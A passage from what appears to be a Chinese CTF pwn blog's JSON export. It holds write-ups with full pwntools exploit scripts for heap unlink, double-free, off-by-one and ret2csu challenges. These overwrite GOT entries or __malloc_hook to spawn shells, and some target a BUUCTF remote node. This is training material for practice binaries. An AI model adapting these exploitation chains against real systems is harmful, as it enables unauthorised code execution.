思路：利用unlink修改heaparray[0][1][2]，看exp吧 from pwn import * p = process('./stkof') elf = ELF('./stkof') libc = ELF('./libc.so.6') def add(size): p.sendline('1') p.sendline(str(size)) def edit(index,size,content): p.sendline('2') p.sendline(str(index)) p.sendline(str(size)) p.send(content) def delete(index): p.sendline('3') p.sendline(str(index)) add(0x10) #chunk1：对抗缓冲区 add(0x30) #chunk2 add(0x80) #chunk3 add(0x10) #chunk4 ptr = 0x602140 fd = ptr + 0x10 - 0x18 bk = ptr + 0x10 - 0x10 fake_chunk = p64(0) fake_chunk += p64(0x31) fake_chunk += p64(fd) fake_chunk += p64(bk) fake_chunk += p64(0) * 2 fake_chunk += p64(0x30) fake_chunk += p64(0x90) edit(2,len(fake_chunk),fake_chunk) delete(3) print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;) payload = p64(0) payload += p64(elf.got['free']) payload += p64(elf.got['puts']) payload += p64(elf.got['atoi']) edit(2,len(payload),payload) print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;) payload = p64(elf.plt['puts']) edit(0,8,payload) delete(1) #context.log_level = 'debug' puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8,b'\\x00')) print(&quot;puts addr ----&gt; &quot; + hex(puts_addr)) print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;) libc_base = puts_addr - 0x67860 print(&quot;libc ---&gt; &quot; + hex(libc_base)) system_addr = libc_base + 0x3f550 paylaod = p64(system_addr) edit(2,8,paylaod) p.sendline(&quot;sh&quot;) p.interactive() ","link":"https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"},{"title":"unlink利用—hitcontraining_unlink","content":"unlink 简单说一下吧，不说太多了，比较累了 总结一下 (只讨论2.23版本的libc下的unlink) 利用条件 一个指向heap的指针，在bss段上之类的，最好没开pie，就比较轻松点儿 然后还需要堆溢出或者UAF，目的都是改写smallbin 或是 unsorted bin 的 fd 和 bk 指针 效果 使得已指向chunk 的指针 ptr 变为 ptr - 0x18 通用思路 设指向可 UAF chunk 的指针的地址为 ptr 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink 更详细的思路： 以能够进行堆溢出的场景下说明： 1，申请三个堆块012，0用来溢出，1用来作为unsorted bin，2用来保护 2，伪造chunk0，伪造fd和bk之类的，然后利用堆溢出来改写chunk1的prevsize和size的inuse 3，free1，触发unlink 4，找bss段上的全局指针，看看周围怎么利用，比如改got表 解题 逆向 不看了，简单逆向，漏洞位于在edit中，可以任意修改长度，老漏洞了 思路，伪造chunk，然后unlink到bss处，改写heaparray到free@got，然后修改为system 下图为atoi，一开始是修改atoi为system，然后输入sh拿到shell，本地可以打通，但是远程就不行了，qswl 还有libcsearcher，我的libcsearcher像坨屎一样误差就nima离谱，草 exp from pwn import * from LibcSearcher import * #r=process('bamboobox') #r=remote('node3.buuoj.cn',28011) elf=ELF('../hitcontraining_unlink/bamboobox') r = process('../hitcontraining_unlink/bamboobox') def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context) def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context) def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) alloc(0x30,'bbbb') alloc(0x30,'bbbb') alloc(0x80,'cccc') alloc(0x20,'/bin/sh\\x00') glo=0x6020c8+0x10 fd=glo-0x18 bk=glo-0x10 payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90) edit(1,len(payload),payload) free(2) free_got=elf.got['free'] log.info(&quot;free_got:%x&quot;,free_got) payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got) #print payload1 edit(1,len(payload),payload1) show() #log.info(&quot;got:%s&quot;,r.recv()) free_addr=u64(r.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, b'\\x00')) log.info(&quot;free_addr:%x&quot;,free_addr) libc=LibcSearcher('free',free_addr) libc_base=free_addr-libc.dump('free') log.info(&quot;libc_addr:%x&quot;,libc_base) system_addr=libc_base+libc.dump('system') log.info(&quot;system_addr:%x&quot;,system_addr) edit(1,0x8,p64(system_addr)) pause() free(3) r.interactive() 被环境恶心死了，本地的cccc ","link":"https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"},{"title":"gyctf_2020_some_thing_exceting","content":"第一次尝试了边做题边写wp，感觉还挺好，因为这样可以使自己思路更开阔，很不错 这个题自己没做出来 原因：ptmalloc管理机制还是不熟悉，没有想起来double free的利用条件（脑子抽了，不知道当时想的什么 逆向和解题中的思路 main函数 r_start函数 可以发现这个函数要求在根目录下有一个flag文件，要不然就exit了，所以本地做题的时候要创建一下 然后还可以发现这个bss段中有个变量貌似很可疑，后期关注下，看看能不能伪造chunk啥的 add函数 这个程序没有edit功能 delete 初步分析是有UAF洞 show 我们直接新建两个堆块，看一下内存分布是什么样子的 from pwn import * local = 1 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x20,'AAAAAAAA',0x30,'BBBBBBBB') add(0x10,'aaaaaaaa',0x50,'bbbbbbbb') pause() 看一下chunk分布 可以初步判定，绿色框框框起来的chunk是管理后面两个ba和na的chunk 但是前面两个非常大的chunk暂时就不知道是用来做什么的了 分布很清晰 刚刚发现，flag被存到了bss的一个数组里面，见r_start函数 而且bss段的分布很有意思 heap[] byte_6020A0 (96) s[] (flag) 这个结构后续肯定可以利用 可以看到，free后的数据区域已经被清空 我现在的思路是既然程序本身好像没有漏洞，那么肯定不能向拿shell的思路去进行了 那我们不妨就考虑信息泄漏这个途径，我们可不可以利用double free呢？尝试改写fd指针到byte_6020A0的位置处，然后show打印内容，因为bss段那样的内存分布，一个可以泄漏出flag，本地调试一下 实验一下发现不可取，因为free后将内容清空了 那么还有一个思路是因为我们有堆管理指针，那么我们可不可以改写指针到bss段呢？再度尝试一下 这种思路也失败了，因为发现无法进行溢出，连空字节都无法溢出 思路三：或许之前大chunk里面有可以利用的点，我们不妨看看 好吧，并没有发现什么玄机，我准备看wp了:( 开幕雷击，发现wp利用的是double free，但是在第一个思路里我失败了，本地double free会报错？ oh no 我傻了，double free的利用条件是前后free的两个chunksize要相同，这样在bin里面才会连接起来，cao，我是sb 这样岂不是简单很多了？？淦，本来可以自己出的，算了，反正没看exp，自己写exp好了 可以看到已经形成闭环了，至于为啥选0x60，是因为bss段上那个数值是96 已经伪造成功了 exp from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x30,'AAAAAAAA',0x50,'BBBBBBBB') #chunk0 add(0x30,'aaaaaaaa',0x50,'bbbbbbbb') #chunk1 delete('0') delete('1') delete('0') bss_6020A0 = 0x6020A0 - 0x8 add(0x50,p64(bss_6020A0),0x50,'A') #chunk2 add(0x50,'B',0x50,'C') #chunk3 show('3') print(p.recv()) p.interactive() ","link":"https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"},{"title":"ret2csu—缩短payload","content":"起因是这样的，跟一个pwn师傅聊天的时候，他发给我了一道题，说很有意思，我就打开来看了看 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;welcome~\\n&quot;, 9uLL); vul(); return 0; } vul函数 ssize_t vul() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x100uLL); } 就这？ 我他妈直接ret2csu 先写一下原理吧，到时候复习比较方便 ret2csu __libc_csu_init 重点关注这个函数 为啥呢，因为它里面有很好的gadget 我们知道在64位环境下，前六个参数是由寄存器来传递的，分别是rdi rsi rdx rcx r8 r9 那我们看这两个片段 第一个是pop片段 .text:000000000040060A pop rbx .text:000000000040060B pop rbp .text:000000000040060C pop r12 .text:000000000040060E pop r13 .text:0000000000400610 pop r14 .text:0000000000400612 pop r15 .text:0000000000400614 retn 这一串pop和retn分别打到了寄存器上然后还能retn，但是我们需要的是那六个寄存器，但是看前一个片段 .text:00000000004005F0 mov rdx, r13 .text:00000000004005F3 mov rsi, r14 .text:00000000004005F6 mov edi, r15d .text:00000000004005F9 call qword ptr [r12+rbx*8] 我们可以利用这个来调整寄存器这样edi，rsi，rdx前三个寄存器便可以由我们来控制了 利用 我们看ctfwiki 然后wiki给了一个几乎万能的exp from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF('./level5') sh = process('./level5') write_got = level5.got['write'] read_got = level5.got['read'] main_addr = level5.symbols['main'] bss_base = level5.bss() csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1) sh.recvuntil('Hello, World\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(sh.recv(8)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') execve_addr = libc_base + libc.dump('execve') log.success('execve_addr ' + hex(execve_addr)) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh.recvuntil('Hello, World\\n') csu(0, 1, read_got, 16, bss_base, 0, main_addr) sh.send(p64(execve_addr) + '/bin/sh\\x00') sh.recvuntil('Hello, World\\n') ## execve(bss_base+8) csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) sh.interactive() 这个来泄漏libc是通过write函数，难度上来说比puts要更难了 思路就是先泄漏libc，然后劫持read函数，向bss段上写入/bin/sh，和system之类的系统函数，然后劫持程序流到bss段拿shell 解题 那我们直接照抄exp就好了，反正大同小异（打脸 from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060A def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' payload = b'a' * 0x88 payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.recvuntil('~\\n') p.send(payload) p.send(p64(execve)) p.send('/bin/sh\\0') sleep(1) #p.send(p64(execve) + b'/bin/sh\\x00') 想象是美好的，但是很快就发现了问题 程序根本无法跳转到main函数，思考了好久就是没想通 后来经过师傅提醒发现payload长度超了 只允许read 0x100个字节，那我们只好缩减payload 经过调试发现rbx寄存器本来就是0，所以我们可以省略p64(rbx)，结果发现长度正好为0x100 然后第二次向bss写数据的时候就又不行了，这个时候rbx就不是0了 所以换个思路，就用普通栈溢出的思路，找到binsh和system的地址，直接执行 由于我本地的环境有很大问题，LibcSearcher不准，每次偏移都差0x1000，我通过gdb的magic找到了system的地址，但是实在找不到binsh的地址了，所以就此作罢，但是理论上是绝对可以打通的 我贴一下最后的exp from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060B def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' p.recvuntil('~\\n') payload = b'a' * 0x88 pop_ret = 0x400613 payload += p64(pop_ret) + p64(binsh) + p64(system) print(&quot;binsh -----&gt; &quot; + hex(binsh)) print(&quot;system -----&gt; &quot; + hex(system)) p.sendline(payload) p.interactive() 然后贴一下我魔改了师傅的exp from pwn import * from LibcSearcher import LibcSearcher def ret2libc(leak, func, path=''): if path == '': libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + 0x3f550 - 0x1000 wrong = base + libc.dump('system') print(hex(wrong)) binsh = base + libc.dump('str_bin_sh') print('str 的偏移为 ： ' + hex(libc.dump('str_bin_sh'))) print('system 的偏移为 ：' + hex(libc.dump('system'))) else: libc = ELF(path) base = leak - libc.sym[func] system = base + libc.sym['system'] binsh = base + libc.search(b'/bin/sh').__next__() return (system,binsh,base) def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely payload = b'a' * 0x88 payload += p64(gadget_pop) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget_call) payload += b'a' * 0x38 payload += p64(last) p.send(payload) return payload s = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\0')) uu64 = lambda data :u64(data.ljust(8,b'\\0')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) context.log_level = 'DEBUG' binary = './pwn2' context.binary = binary elf = ELF(binary,checksec=False) def dbg(): gdb.attach(p) pause() p = process(binary) #p = remote(&quot;47.95.195.235&quot;,44002) #libc = ELF(&quot;./libc-2.23.so&quot;) main = 0x400587 gadget_pop = 0x40060B gadget_call =0x4005F0 got_write = elf.got['write'] p.recvuntil('\\n') csu(0,1,got_write,8,got_write,1,main) gdb.attach(p) #ru(&quot;welcome~\\n&quot;) write_addr = uu64(r(6)) print('write ---&gt; ' + hex(write_addr)) system,binsh,base = ret2libc(write_addr,'write','') print('system ----&gt; ' + hex(system)) print('binsh ----&gt; ' + hex(binsh)) print(hex(base)) pop_ret = 0x400613 payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system) sla(&quot;welcome~\\n&quot;,payload3) itr() orz wtcl ","link":"https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"},{"title":"一道got表可写的off-by-one — hitcontraining_heapcreator","content":"这个题出了一些坑点，我吐了，做了好久 先正常走一遍吧 off-by-one的流程就是extend chunk 粗糙的写一下刻在DNA里的exp，细节问题错了就错了吧 malloc(overflow) malloc(1) malloc(2) malloc(我来守护上面俩东西不被top chunk吃掉) edit(0,payload) free(1) free(2) leak_libc() some_functions_addr() malloc(size(1) + size(2)) edit(1,写到chunk2的fd pointer) 然后就是fastbin attack 嗯，我一开始也这样做的，很顺利在本地getshell，但是远程打不通 在仓库里有本题目的源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ; } 逆向 很容易，没有去除符号表，很nice 创建堆块，这里malloc(0x10)来管理堆块 编辑功能存在off-by-one漏洞，可以溢出一字节 free功能没有use after free 漏洞 show功能，可以来leak libc pwn it！！！ 成功的方法：借助heaparray来改写指针 可以看到管理用户堆的内容上是有指针的，我最喜欢指针了（不是 然后我们可以改写指针，因为防护是这样的： 所以可以攻击got表，注意，攻击got的表的核心在于，，这个题是有现成的指针可以利用！如果没有的话，在ubuntu 16中，我们攻击got表的成本会很高，因为要伪造fastbin的size位 那我们思路就是本文一开始说的，只不过不覆盖fd指针而是覆盖题目给我们留下的罢了 先说说坑点吧，我用了libc-2.23.so，但是远程打不通，本地可通，就很难受，所以干脆直接LibcSearcher ，浪费了很多时间 😦 当时做题的思路都写在print语句里了，还挺好的 exp: from pwn import * from LibcSearcher import * #l3mon_w@nts_A_g1rLfri3nd (bushi) #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',28861) #libc = ELF('./libc.so.6') elf = ELF('./heapcreator') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;第二个exp的思路是因为这个题目有heaparray来管理我们申请的堆块，在heaparray中有指向内容的指针，所以我们可以改写指针来覆盖got表（got表）可写&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 pause() add(0x60,'C') #chunk2 add(0x10,'/bin/sh\\x00') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) delete(2) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- 之前的思路&quot;) print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;) print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :( !!!!!!!&quot;) add(0xe0,'E') #chunk4 = big chunk print(&quot;we can leak libc&quot;) show(1) p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we attack free@got &quot;) free_got = elf.got['free'] #free_addr = libc_base + libc.symbols['free'] system_addr = libc_base + libc.dump('system') print(&quot;free ----------&gt; &quot; + hex(free_got)) print(&quot;system -------&gt; &quot; + hex(system_addr)) payload = p64(__malloc_hook) * 2 payload = payload + p64(0) + p64(0x41) payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got) edit(1,payload) add(0x60,'AAAAAAAA') #chunk5 = chunk2 print(&quot;!!!!!!!!!!!!!!!!!!!!!! 这里不确定编辑块5还是块2，我们就加上p.interactive()拿到原始的交互程序调试一下，经过调试发现没有块5，所以这里我们应该编辑chunk2&quot;) #edit(1,'BBBBBBBB') print(&quot;这里很奇怪，当时我发现大chunk的heaparray在它下面，我还以为是中间出现了不可预知的错误，但是经过调试发现，当我改块1的时候，free_got被改了，那只能证明是改chunk1了&quot;) print(&quot;小声bb，理不清流程就逐个调试（不是）&quot;) edit(1,p64(system_addr)) print(&quot;通过free来触发 system(/bin/sh\\00) 本地测试可拿shell， 美汁汁 :) 好，好起来了（不是）&quot;) delete(3) p.interactive() 失败的方法：one_gadget打__malloc_hook 本地也能拿shell，那肯定就是libc的原因了，one_gadget地址不一样的原因应该是 但是很奇葩，为神马这么说呢，当我打one_gadget的时候发现$rsp + 0x70的位置是NULL，但是one_gadget打不通，反倒是rsp + 0x30可以通 截图： 但是我用0x30的gadget竟然通了，本地可拿shell 不知道怎么回事，反正我人傻了，有感兴趣的师傅可以调试一下什么原因，然后给弟弟讲讲（orz 贴一下exp吧，下午再调试一下看看LibcSearcher能不能通 exp: from pwn import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26697) libc = ELF('./libc.so.6') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) pause() p.interactive() 又实验了两次，失败的方法终于通了 怎么说呢，比赛不给libc果然是流氓题 在github上下了俩libc都不行，最后用buuctf资源库里面提供的libc打通了 exp没变，就是多加了两行one_gadget_list(哈哈哈哈哈哈哈草) from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26902) libc = ELF('./libc-2.23.so') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] #one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] #one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207] #one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897] one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) 